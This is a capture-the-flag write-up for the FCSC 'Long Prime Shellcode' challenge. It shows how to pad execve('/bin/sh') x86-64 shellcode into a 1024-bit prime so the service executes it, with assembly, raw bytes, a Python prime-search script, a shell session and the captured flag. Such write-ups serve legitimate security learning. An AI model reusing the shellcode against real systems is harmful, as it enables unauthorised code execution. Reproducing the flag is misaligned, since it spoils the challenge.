# Long Prime Shellcode


## Challenge Statement

After Encrypted Shellcode and Hashed Shellcode, why not play with a large prime number? :-)

---

## Solution


This challenge requires constructing a valid x86-64 shellcode that also represents a large prime number. The remote service:

1. Reads your input as a decimal integer, converts it to an MPI (large integer).
2. Checks that it is between 1024 and 4095 bits.
3. Verifies it is prime via Miller–Rabin.
4. Writes the integer’s big‑endian binary representation onto the stack, marks the page executable, and calls it as code.

To solve it, you need your payload to satisfy both properties:

- **Executes** a `execve("/bin/sh", argv, NULL)` shellcode.
- **Is prime** and **1024 bits** long.

---

## Solution Overview

1. **Choose your shellcode**: a minimal, position‑independent 25‑byte execve(`/bin/sh`) stub:

   ```asm
   xor    rdx, rdx
   mov rbx, 0x0068732f6e69622f   ; "/bin/sh\0"
   push   rbx
   mov    rdi, rsp              ; rdi = "/bin/sh"
   push   rdx                   ; NULL
   push   rdi                   ; &"/bin/sh"
   mov    rsi, rsp              ; rsi = argv
   mov    al, 59                ; syscall execve
   syscall
   ```

2. **Wrap**:

   - Prepend a single `NOP (0x90)` so the MSB of the integer is 1 → exactly 1024 bits.
   - Append a `RET (0xC3)` in case `execve` fails.
   - Total so far: **27 bytes**.

3. **Pad** out to exactly 128 bytes (1024 bits):

   - Reserve 128 − 27 = 101 bytes for random tail data.
   - Force the integer to be odd by setting the low bit of the tail.

4. **Search** for a prime:

   - Convert `prefix = 0x90 || shellcode || 0xC3` into a big integer.
   - Loop: generate random `tail` of 101 bytes with LSB = 1.
   - `candidate = (prefix_int << (101×8)) | tail`.
   - Check `candidate.bit_length() == 1024` and `is_prime(candidate)`.
   - Repeat until prime found (expected a few hundred tries).

5. **Deploy**:

   ```bash
   $ nc chall.fcsc.fr 2100
   <paste_decimal_prime>⏎
   $ ls; cat flag.txt
   FCSC{...}
   ```

---

## Example Python Script

```python
#!/usr/bin/env python3
import random
from gmpy2 import mpz, is_prime

# 1) 25-byte execve("/bin/sh") shellcode
shellcode = bytes([
    0x31,0xd2,                         # xor rdx, rdx
    0x48,0xbb,                         # mov rbx,
      0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,
    0x53,                              # push rbx
    0x48,0x89,0xe7,                    # mov rdi, rsp
    0x52,                              # push rdx
    0x57,                              # push rdi
    0x48,0x89,0xe6,                    # mov rsi, rsp
    0xb0,0x3b,                         # mov al, 59
    0x0f,0x05                          # syscall
])
assert len(shellcode) == 25

# 2) Build prefix: NOP + shellcode + RET
prefix = b"\x90" + shellcode + b"\xc3"
prefix_int = int.from_bytes(prefix, 'big')
TAIL_BYTES = 128 - len(prefix)
suffix_bits = TAIL_BYTES * 8

# 3) Prime search
def find_prime():
    trials = 0
    while True:
        trials += 1
        tail = (random.getrandbits(suffix_bits - 1) << 1) | 1
        candidate = (prefix_int << suffix_bits) | tail
        if candidate.bit_length() != 1024:
            continue
        if is_prime(mpz(candidate)):
            print(f"Found in {trials} trials:")
            print(candidate)
            return

if __name__ == '__main__':
    find_prime()
```

Install dependencies and run:

```bash
pip3 install gmpy2
python3 make_prime_shellcode.py
```

Paste the resulting decimal prime into the service to get your shell and the flag.

101256902087988384546784560479096443409125276001505639585750527937943163518713649807339209649027792767486083995833075843667491648249394132614292650290033847791778514456253224452373506164263871437725798844999292886529790131826211367935999715982930156581565771182371133604029982916763586294847500804990229669949

```bash
(base) salaheddinealabouch@Salah-Eddines-MacBook-Pro-2 Desktop % nc chall.fcsc.fr 2100
101256902087988384546784560479096443409125276001505639585750527938057204161075125822942058954733972627983013326631739598457294467307309184233551664392837205290729900997953321245584243222988145969219726357402763100438306943579885771605734202941162284352974634571392981203813954826558802833779220386262715945329
ls
flag.txt
long-prime-shellcode
cat flag.txt
FCSC{41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662}
```

---

## Flag

```
FCSC{41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662}
```